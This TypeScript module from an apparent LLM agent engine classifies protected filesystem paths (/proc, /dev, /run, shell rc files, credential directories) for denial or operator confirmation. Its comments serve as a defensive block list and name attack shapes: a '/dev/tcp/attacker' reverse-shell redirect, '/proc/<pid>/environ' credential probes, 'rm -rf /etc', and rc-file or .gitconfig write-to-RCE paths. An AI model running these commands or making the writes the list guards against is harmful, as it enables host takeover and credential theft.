// Protected paths. Hardcoded in code, NOT in policy file: policy
// can never relax these. Two tiers:
//
//   - 'deny'     — refuse outright in any op. Reads and writes
//                  alike. Applies to system pseudofs roots (/proc,
//                  /sys, /boot) whose contents are kernel-managed;
//                  an LLM-driven write there is always a bug or
//                  attack. Reads of these are also rejected:
//                  legitimate need is rare, and a
//                  "read /proc/<pid>/environ" probe is a known
//                  credential-exfil shape.
//
//   - 'escalate' — uncovered by writes/deletes. An `allow` rule
//                  that matches one of these paths is upgraded to
//                  `confirm` before returning to the caller.
//                  `deny` rules still win (operator who wants
//                  explicit deny on a parent layer keeps that
//                  authority). Reads are not affected — operators
//                  legitimately read /etc/hosts, .git/HEAD,
//                  ~/.bashrc.
//
// The `escalate` tier intentionally does NOT block writes
// outright. `.git/HEAD` rewrites happen via `git_*` tools that
// have their own confirm UX in policy; the operator can authorize
// `.git/` writes once per session via the modal. The `deny` tier
// IS outright because there is no analogous "git_* for /proc" — a
// write there is always wrong.
//
// Bash-side enforcement (a `bash` tool running `rm -rf /etc`) is
// NOT covered here: bash invocations consult `tools.bash`, not
// `tools.*_file`. The bash resolver's `cmdRm` carries a hardcoded
// `RM_REFUSE_ROOTS` blocklist; the score gate adds defense in
// depth for non-rm shapes (`find / -delete`). This module catches
// fs-tool-driven attempts (`write_file`, `edit_file`, `glob`,
// `grep`) that bypass the bash AST entirely.

import { resolve } from 'node:path';

export type ProtectedTier = 'deny' | 'escalate';

export type ProtectedOp = 'read' | 'write';

export interface ProtectedClassifyInput {
  absPath: string;
  op: ProtectedOp;
  home: string;
  cwd: string;
}

// Absolute prefixes that always deny. Each entry is a directory:
// a path classifies as `deny` when it equals one of these or
// descends from one (`/proc` matches `/proc/foo` but not
// `/procfoo`).
//
// `/dev` — device nodes are kernel-managed like /proc and /sys.
// An LLM-driven write to `/dev/sda` would overwrite a raw disk;
// `cat /dev/tcp/attacker/80 > shell` is the canonical reverse-
// shell-via-redirect shape. Reads of `/dev/random` or `/dev/zero`
// are legitimate but rare; refusing them outright pushes
// operators to explicitly invoke a non-LLM tool, which is the
// safer default for kernel-managed pseudofs.
//
// `/var/run` + `/run`: both host SOCKETS to privileged daemons —
// `/var/run/docker.sock` (root container access),
// `/run/postgresql/.s.PGSQL.5432` (DB admin),
// `/run/dbus/system_bus_socket` (system reconfig via PolicyKit /
// systemd). Write to those sockets is game over for the host.
// Read of socket files exposes daemon state. POSIX semantics:
// `/var/run` is symlinked to `/run` on modern Linux systemd
// hosts; we list both for portability — older distros (Alpine,
// some embedded) still have a real `/var/run`.
const SYSTEM_DENY_ROOTS: readonly string[] = ['/proc', '/sys', '/boot', '/dev', '/run', '/var/run'];

// Carve-outs from the deny prefixes above. Two real user-facing
// paths live under `/run` on modern Linux:
//   - `/run/media/<user>/<volume>` — mount points for removable
//     media (udisks2, the default mount surface on Debian / Ubuntu /
//     Arch / Manjaro / Fedora etc.). An operator can legitimately
//     have their working repo on an external drive; everything
//     under this prefix is a regular filesystem they own.
//   - `/run/user/<uid>` — XDG_RUNTIME_DIR. Per-user runtime state
//     (often a tmpfs scoped to the login session). Standard target
//     for application config, IPC, and ephemeral caches; users
//     write here all day. NOT the same as the system-wide sockets
//     in /run/dbus, /run/systemd, etc.
// Refusing deny for paths starting with these prefixes preserves
// the original threat coverage (privileged daemon sockets stay
// blocked) without false-positiving user workspaces.
const SYSTEM_DENY_EXCEPTIONS: readonly string[] = ['/run/media', '/run/user'];

// Tilde-rooted files that escalate on write. Each entry is
// resolved against the operator's `$HOME` at classification time.
// Lists canonical shell rc files plus the agent's own config
// dirs so the model can't quietly amend the policy via
// `write_file`.
//
// `.netrc` / `.npmrc`: per-protocol credential files (`.netrc`
// for FTP/HTTP, `.npmrc` for the npm registry). Operator writes
// to these are legitimate during account setup but rare during
// agent work; escalating on write defends against silent
// credential injection by a hostile agent definition.
//
// Entries that need explanation:
//   `.zshenv` — sourced in EVERY zsh invocation including
//       non-interactive `zsh -c "..."` script form. Different
//       from `.zshrc` (interactive-only); write here is RCE on
//       every subsequent zsh subprocess. On macOS Catalina+ zsh
//       is the default user shell, so this is the dominant attack
//       path for "modify shell rc, gain RCE on next session".
//   `.zprofile` — zsh login-shell init. Parallel to
//       `.bash_profile`.
//   `.bash_aliases` — typically sourced by `.bashrc`; same RCE
//       shape via aliases.
//   `.config/fish/config.fish` — fish-shell init. XDG variant.
//   `.tmux.conf` — `run-shell` directive lets tmux exec arbitrary
//       commands at config-load time.
//   `.inputrc` — readline keybind macros; bind a keystroke to a
//       shell-injected sequence.
//   `.gitconfig` — `core.sshCommand` / `core.pager` / `core.editor`
//       / `credential.helper` / `[alias] *` are executable hooks
//       that fire on standard git ops. Write is RCE on next
//       `git pull`. Also in HIDE_PATHS_FILES (sandbox-side); the
//       engine policy layer must cover it too so a tool running
//       in `degraded` (sandbox unavailable) or `host` profile
//       still escalates the write.
//   `.docker/config.json` — Docker registry auth + `credsStore`
//       (helper-binary indirection — write is RCE on next
//       docker login / pull / push).
//   `.cargo/credentials.toml` — crates.io API token.
//   `.git-credentials` — git HTTP creds store.
//   `.pypirc` — PyPI auth token.
//   `.boto` — Legacy AWS Boto creds.
const TILDE_ESCALATE_FILES: readonly string[] = [
  '.bashrc',
  '.zshrc',
  '.zshenv',
  '.zprofile',
  '.profile',
  '.bash_profile',
  '.bash_aliases',
  '.config/fish/config.fish',
  '.tmux.conf',
  '.inputrc',
  '.netrc',
  '.npmrc',
  '.pypirc',
  '.gitconfig',
  '.git-credentials',
  '.docker/config.json',
  '.cargo/credentials.toml',
  '.boto',
];

// `.ssh`, `.aws`, `.gnupg`, `.kube`: per-service credential
// trees. Writing any file under them admits silent
// key/credential injection (`.ssh/authorized_keys`,
// `.aws/credentials`, `.gnupg/private-keys-v1.d/`, `.kube/config`).
// Reads pass through — agents legitimately enumerate
// `.kube/config` to know which cluster they're targeting — but
// writes always escalate. Adding these to the dir list (vs the
// file list) means the classifier matches `.ssh/known_hosts` AND
// `.ssh/foo/bar` alike via `startsWithSegment`.
//
// This list is the dual of the sandbox-side HIDE_PATHS_DIRS.
// Sandbox masks credentials inside the wrapped process; engine
// policy is the ONLY defense when running in `degraded` (sandbox
// unavailable) or `host` profile. The lists must stay in sync —
// asymmetry means a write to `.config/gcloud/credentials.db` from
// an fs tool in `mode: acceptEdits` + `host` profile would NOT
// escalate to confirm (silent credential injection).
const TILDE_ESCALATE_DIRS: readonly string[] = [
  '.config/agent',
  '.config/claude',
  '.config/forja',
  '.config/gcloud',
  '.config/azure',
  '.config/op',
  '.config/sops',
  '.ssh',
  '.aws',
  '.gnupg',
  '.kube',
  '.docker',
  '.cargo',
  '.terraform.d',
  '.ansible',
  '.rustup',
  '.subversion/auth',
  '.local/share/forja',
];

// Absolute roots that escalate on write regardless of cwd or home.
const ABSOLUTE_ESCALATE_ROOTS: readonly string[] = ['/etc'];

// Project-relative directories that escalate on write. Each entry is
// joined against the session's `cwd` at classification time. The
// engine's own state lives under `.agent/` (sessions, traces, policy
// archive); CI/operator state is under `.git/` and `.claude/`.
const CWD_ESCALATE_DIRS: readonly string[] = ['.git', '.agent', '.claude'];

// Posix-only. Path comparison uses textual prefix match after
// normalization; `startsWith(prefix + '/')` plus equality avoids
// false positives like `/procfoo` matching `/proc`.
const startsWithSegment = (path: string, prefix: string): boolean =>
  path === prefix || path.startsWith(`${prefix}/`);

// Resolve a tilde-or-relative entry to its absolute form. Used by both
// the classifier and the policy validator (policy load must reject
// patterns that would shadow these targets).
const resolveTildeFile = (home: string, file: string): string => resolve(home, file);
const resolveCwdDir = (cwd: string, dir: string): string => resolve(cwd, dir);

// Hot-path memoization. `classifyProtectedPath` runs in the
// per-tool-call hot path AND inside the bash bypass capability
// loop (per-cap). Without this cache, every invocation calls
// `resolve(home, ...)` 20+ times for the tilde + cwd escalate
// targets. `home` is frozen at SessionStart and `cwd` is also
// frozen, so the resolves are pure on the (home, cwd) tuple.
//
// Cache key = `home + '\0' + cwd` (NUL byte separator avoids
// collisions where one of the strings ends with the other).
// Cache entries are bounded by the union of distinct (home, cwd)
// tuples the process ever sees — for a typical agent session
// that's ONE entry; even for tests bootstrapping many engines
// it's tens.

interface ResolvedProtectedTargets {
  tildeEscalateFiles: readonly string[];
  tildeEscalateDirs: readonly string[];
  cwdEscalateDirs: readonly string[];
}

const targetCache = new Map<string, ResolvedProtectedTargets>();

const getResolvedTargets = (home: string, cwd: string): ResolvedProtectedTargets => {
  const key = `${home}\0${cwd}`;
  let entry = targetCache.get(key);
  if (entry === undefined) {
    entry = {
      tildeEscalateFiles: TILDE_ESCALATE_FILES.map((f) => resolveTildeFile(home, f)),
      tildeEscalateDirs: TILDE_ESCALATE_DIRS.map((d) => resolveTildeFile(home, d)),
      cwdEscalateDirs: CWD_ESCALATE_DIRS.map((d) => resolveCwdDir(cwd, d)),
    };
    targetCache.set(key, entry);
  }
  return entry;
};

export const classifyProtectedPath = (input: ProtectedClassifyInput): ProtectedTier | null => {
  const { absPath, op, home, cwd } = input;

  // Tier `deny` — applies to reads and writes alike. SYSTEM_DENY_ROOTS
  // is a constant (no per-call resolve needed). Exceptions list
  // covers user-facing carve-outs inside /run (see comment on
  // SYSTEM_DENY_EXCEPTIONS): /run/media/<user> for removable media
  // mount points, /run/user/<uid> for XDG_RUNTIME_DIR.
  for (const root of SYSTEM_DENY_ROOTS) {
    if (!startsWithSegment(absPath, root)) continue;
    let excepted = false;
    for (const ex of SYSTEM_DENY_EXCEPTIONS) {
      if (startsWithSegment(absPath, ex)) {
        excepted = true;
        break;
      }
    }
    if (excepted) continue;
    return 'deny';
  }

  // Tier `escalate` — only writes/deletes are upgraded. Reads pass
  // through; the engine's regular allow/confirm/deny chain still runs.
  if (op === 'read') return null;

  // ABSOLUTE_ESCALATE_ROOTS is constant too.
  for (const root of ABSOLUTE_ESCALATE_ROOTS) {
    if (startsWithSegment(absPath, root)) return 'escalate';
  }
  // Tilde + cwd resolves come from the (home, cwd) cache.
  const targets = getResolvedTargets(home, cwd);
  for (const file of targets.tildeEscalateFiles) {
    if (absPath === file) return 'escalate';
  }
  for (const dir of targets.tildeEscalateDirs) {
    if (startsWithSegment(absPath, dir)) return 'escalate';
  }
  for (const dir of targets.cwdEscalateDirs) {
    if (startsWithSegment(absPath, dir)) return 'escalate';
  }

  return null;
};

// Render the same set of absolute targets the classifier checks
// against. Used by `parsePolicy` to reject allow/confirm patterns
// that would shadow these locations. Returned as absolute strings —
// the policy validator compares pattern → resolvable absolute and
// verifies it doesn't EQUAL one of these (literal redefinition).
// Glob shapes (`/etc/**`) are intentionally allowed as `deny_paths`
// entries; the validator only rejects allow/confirm.
export interface ProtectedTargets {
  systemDeny: readonly string[];
  absoluteEscalate: readonly string[];
  tildeEscalateFiles: readonly string[];
  tildeEscalateDirs: readonly string[];
  cwdEscalateDirs: readonly string[];
}

export const protectedTargets = (home: string, cwd: string): ProtectedTargets => ({
  systemDeny: SYSTEM_DENY_ROOTS,
  absoluteEscalate: ABSOLUTE_ESCALATE_ROOTS,
  tildeEscalateFiles: TILDE_ESCALATE_FILES.map((f) => resolveTildeFile(home, f)),
  tildeEscalateDirs: TILDE_ESCALATE_DIRS.map((d) => resolveTildeFile(home, d)),
  cwdEscalateDirs: CWD_ESCALATE_DIRS.map((d) => resolveCwdDir(cwd, d)),
});

// Stable list of all protected absolute prefixes (deny + escalate
// combined) for use by policy validators that don't care about tier
// — they just need to reject allow patterns whose literal form would
// shadow ANY protected target.
export const allProtectedRoots = (home: string, cwd: string): readonly string[] => {
  const t = protectedTargets(home, cwd);
  return [
    ...t.systemDeny,
    ...t.absoluteEscalate,
    ...t.tildeEscalateFiles,
    ...t.tildeEscalateDirs,
    ...t.cwdEscalateDirs,
  ];
};
